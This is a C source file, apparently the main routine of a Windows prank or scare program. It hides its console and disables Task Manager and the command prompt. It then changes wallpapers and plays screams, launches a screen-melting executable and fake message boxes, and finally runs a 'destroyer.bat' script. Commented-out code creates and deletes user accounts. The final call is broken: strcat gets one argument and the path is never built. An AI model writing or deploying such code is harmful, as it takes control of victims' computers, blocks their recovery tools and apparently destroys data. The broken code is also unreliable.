#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <processthreadsapi.h>
#include "src/boolean.h"
#include "src/createDesktopFiles.h"
#include "src/disableTaskMgr.h"
#include "src/disableCMD.h"
#include "src/playMusic.h"
#include "src/changeDesktopImage.h"
#include "src/reboot.h"
#include <unistd.h>
#include "src/createCreepyUser.h"
#include "src/deleteUser.h"
#include "src/swapMouseButtons.h"
#include "src/helpGlitch.h"
#include "src/changeUserPassword.h"
#include "src/progClock.h"
#include "src/createRectGlitch.h"
#include "src/moveDesktopIcons.h"
#include "src/createChildProcess.h"
#include "src/flashScreen.h"
#include "src/createGoogleSearches.h"
#include "src/killProcessByName.h"

// #ifdef WIN32
// #include <io.h>
// #define F_OK 0
// #define access _access
// #endif

// FILE* modeF;
// char fileContent[200];
// int mode;

// void increaseMode() {
//     modeF = fopen64("mode.txt", "r+");
//     mode++;
//     fprintf(modeF, "%d", mode);
//     fclose(modeF);
// }

int main() {
    HWND window = GetConsoleWindow();
    ShowWindow(window, SW_HIDE);

    char currentDir[PATH_MAX];
    GetCurrentDirectoryA(PATH_MAX, currentDir);

    // bool fileExists = access("mode.txt", F_OK) == 0;
    // printf("fileExists = %d\n", fileExists);
    // modeF = fileExists ? fopen64("mode.txt", "r+") : fopen64("mode.txt", "w+");

    // int c = fgetc(modeF);
    // if (c == EOF) {
    //     mode = 0;
    //     fprintf(modeF, "%d", mode);
    // } else {
    //     ungetc(c, modeF);
    //     fscanf(modeF, "%s", &fileContent);

    //     for (int i = 0; i < strlen(fileContent); i++) {
    //         if (fileContent[i + 1] == '\0') {
    //             if (fileContent[i] == '0') mode = 0;
    //             else mode = (int)(fileContent[i] - '0');
    //         }
    //     }
    // }

    // fclose(modeF);

    // printf("mode = %d\n", mode);

    int totalSecs = 0;

    disableTaskMgr();
    disableCMD();
    changeDesktopImage("\\assets\\Background #1.jpg");
    createDesktopFiles();
    playMusic("\\assets\\Music #1.wav", true);
    createGoogleSearches();
    totalSecs += 62;
    changeDesktopImage("\\assets\\HELP.jpg");
    playMusic("\\assets\\Scream #1.wav", false);
    changeDesktopImage("\\assets\\Background #2.jpg");
    playMusic("\\assets\\Music #2.wav", true);
    totalSecs += 5;
    progClock(totalSecs);
    // createCreepyUser(L"Blood1");
    // createCreepyUser(L"Blood2");
    // createCreepyUser(L"Blood3");
    // createCreepyUser(L"Blood4");
    // createCreepyUser(L"Blood5");
    // createCreepyUser(L"Blood6");
    // createCreepyUser(L"Blood7");
    // createCreepyUser(L"Blood8");
    // createCreepyUser(L"Blood9");
    // createCreepyUser(L"Blood10");
    // deleteUser(L"Blood1");
    // deleteUser(L"Blood2");
    // deleteUser(L"Blood3");
    // deleteUser(L"Blood4");
    // deleteUser(L"Blood5");
    // deleteUser(L"Blood6");
    // deleteUser(L"Blood7");
    // deleteUser(L"Blood8");
    // deleteUser(L"Blood9");
    // deleteUser(L"Blood10");
    totalSecs += 44;
    createRectGlitch(totalSecs);
    changeDesktopImage("\\assets\\Background #3.jpg");
    playMusic("\\assets\\Music #3.wav", true);
    totalSecs += 55;
    moveDesktopIcons(totalSecs);
    changeDesktopImage("\\assets\\Background #4.jpg");
    playMusic("\\assets\\Music #4.wav", true);
    char messageBoxPath[PATH_MAX];
    strcpy(messageBoxPath, currentDir);
    strcat(messageBoxPath, "\\bin\\createMessageBox.exe");
    char screenMelterPath[PATH_MAX];
    strcpy(screenMelterPath, currentDir);
    strcat(screenMelterPath, "\\bin\\ScreenMelter.exe");
    createChildProcess(messageBoxPath);
    totalSecs += 10;
    progClock(totalSecs);
    createChildProcess(screenMelterPath);
    totalSecs += 22;
    progClock(totalSecs);
    killProcessByName("ScreenMelter.exe");
    changeDesktopImage("\\assets\\Background #5.jpg");
    playMusic("\\assets\\Music #5.wav", true);
    totalSecs += 10;
    flashScreen(totalSecs);
    char scndmessageBoxPath[PATH_MAX];
    strcpy(scndmessageBoxPath, currentDir);
    strcat(scndmessageBoxPath, "\\bin\\secondMessageBox.exe");
    createChildProcess(scndmessageBoxPath);
    totalSecs += 68;
    progClock(totalSecs);
    char destroyerPath[PATH_MAX];
    strcpy(destroyerPath, currentDir);
    strcat("\\bin\\destroyer.bat");
    system(destroyerPath);

    return 0;
}